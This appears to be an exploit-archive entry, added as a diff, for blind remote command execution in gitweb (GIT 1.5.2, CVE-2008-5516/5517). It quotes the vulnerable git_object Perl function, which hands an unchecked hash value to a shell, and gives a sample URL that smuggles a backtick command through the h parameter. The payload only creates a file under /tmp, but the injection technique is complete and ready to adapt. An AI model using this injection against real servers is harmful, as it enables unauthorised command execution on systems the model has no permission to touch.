@@ -1,0 +1,36 @@
+# Exploit Title: gitWeb remote command execution
+# Date: 2009.06.19
+# Author: S2 Crew [Hungary]
+# Software Link: -
+# Version: GIT 1.5.2
+# Tested on: debian linux, GIT 1.5.2
+# CVE: CVE-2008-5516 - CVE-2008-5517
+
+# Code:
+
+# The cgi script doesn't show the command output *blind command execution ;)*
+# Vulnerable functions in gitweb.cgi: git_snapshot(), git_search(), git_object()
+
+
+sub git_object {
+        # object is defined by:
+        # - hash or hash_base alone
+        # - hash_base and file_name
+        my $type;
+
+        # - hash or hash_base alone
+        if ($hash || ($hash_base && !defined $file_name)) {
+                my $object_id = $hash || $hash_base;
+
+                my $git_command = git_cmd_str();
+                open my $fd, "-|", "$git_command cat-file -t $object_id 2>/dev/null"
+                        or die_error('404 Not Found', "Object does not exist");
+                $type = <$fd>;
+                chomp $type;
+                close $fd
+                        or die_error('404 Not Found', "Object does not exist");
+
+        # - hash_base and file_name
+
+# Example
+http://server/cgi-bin/gitweb.cgi?p=sample.git/.git;a=object;f=program.c;h=e69de29bb2d1d6434b8b29ae775ad8c2e48c5391|`touch$IFS/tmp/file.txt`|;hb=9adaf5b35bb6415497d23f089660567227ea3785
